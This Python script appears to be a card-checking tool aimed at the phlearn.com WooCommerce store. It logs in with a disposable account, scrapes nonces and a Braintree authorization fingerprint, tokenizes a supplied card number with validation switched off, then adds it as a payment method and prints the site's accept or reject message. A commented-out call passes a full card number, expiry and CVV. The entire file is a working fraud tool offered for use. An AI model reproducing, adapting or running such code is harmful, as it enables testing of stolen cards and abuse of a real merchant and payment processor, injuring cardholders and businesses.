import requests
import base64
import json


class BraintreeAuth:

    def __init__(self):
        self.Site_Api = "https://phlearn.com/scaq/"
        self.Site_Api_1 = "https://phlearn.com/my-phlearn/add-payment-method/"
        self.Config_Api = "https://phlearn.com/wp-admin/admin-ajax.php"
        self.GraphQL_Api = "https://payments.braintree-api.com/graphql"
        self.Payment_api = "https://phlearn.com/my-phlearn/add-payment-method/"
        self.session = requests.Session()

    def _post_request_site(self):
        headers = {
            "Host": "phlearn.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://phlearn.com",
            "Referer": "https://phlearn.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        playload = "q%5Bprocess_login_signup%5D%5B0%5D%5Busername%5D=yinir50511%40ahaks.com&q%5Bprocess_login_signup%5D%5B0%5D%5Bpassword%5D=yinir50511%40ahaks.com&q%5Bprocess_login_signup%5D%5B0%5D%5B_wpnonce%5D=bb712078bd&q%5Bprocess_login_signup%5D%5B0%5D%5B_wp_http_referer%5D=%2F&q%5Bprocess_login_signup%5D%5B0%5D%5Blogin%5D=yes&nonce=3ad55abddc&action=scaq"
        response = self.session.post(self.Site_Api, headers=headers, data=playload)
        response1 = self.session.get(self.Site_Api_1, headers=headers)

        nonce = self.extract_value(
            response1.text,
            '{"id":"braintree_credit_card","id_dasherized":"braintree-credit-card","name":"Braintree (Credit Card)","debug":true,"type":"credit_card","client_token_nonce":"',
            '",',
        )
        nonce_1 = self.extract_value(
            response1.text,
            '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="',
            '" />',
        )

        Config_payload = (
            f"action=wc_braintree_credit_card_get_client_token&nonce={nonce}"
        )

        Config_Rq = self.session.post(
            self.Config_Api, headers=headers, data=Config_payload
        )

        json_data = Config_Rq.json()["data"]
        base64_bytes = json.loads(base64.b64decode(json_data))
        fingerprint = base64_bytes["authorizationFingerprint"]
        return fingerprint, nonce_1

    def _Post_GraphQL_Api(self, card_number, exp_month, exp_year, cvv):
        fingerprint, nonce = self._post_request_site()
        headers = {
            "Host": "payments.braintree-api.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {fingerprint}",
            "Braintree-Version": "2018-05-10",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        playload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "5fe0266b-ca50-47e8-b86d-c35e7f767e13",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{card_number}",
                        "expirationMonth": f"{exp_month}",
                        "expirationYear": f"{exp_year}",
                        "cvv": f"{cvv}",
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        response = self.session.post(
            self.GraphQL_Api, headers=headers, data=json.dumps(playload)
        )
        try:
            data = response.json()
            card_token = data["data"]["tokenizeCreditCard"]["token"]
        except Exception as err:
            print(err)
            print(response.text)
            return None
        else:
            headers1 = {
                "Host": "phlearn.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "902",
                "Origin": "https://phlearn.com",
                "Referer": "https://phlearn.com/my-phlearn/add-payment-method/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
            }
            playload1 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=master-card&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={card_token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%221e5a07769ef22af0e0546d8c751f99f9%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%221e5a07769ef22af0e0546d8c751f99f9%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-phlearn%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
            payment = self.session.post(
                self.Payment_api, headers=headers1, data=playload1
            )
            print(payment.text)

            error_message = self.extract_value(
                payment.text, '<ul class="woocommerce-error" role="alert">', "</ul>"
            )
            successs_message = self.extract_value(
                payment.text, '<ul class="woocommerce-message" role="alert">', "</ul>"
            )
            print(error_message)
            if error_message is None:
                print(successs_message)

    @staticmethod
    def extract_value(source, left, right):
        """Extract value from the source based on delimiters"""
        try:
            start = source.index(left) + len(left)
            end = source.index(right, start)
            return source[start:end]
        except ValueError:
            return None


"""R1 = BraintreeAuth()
R1._post_request_site()
R1._Post_GraphQL_Api("5154620020855506", "05", "25", "391")"""
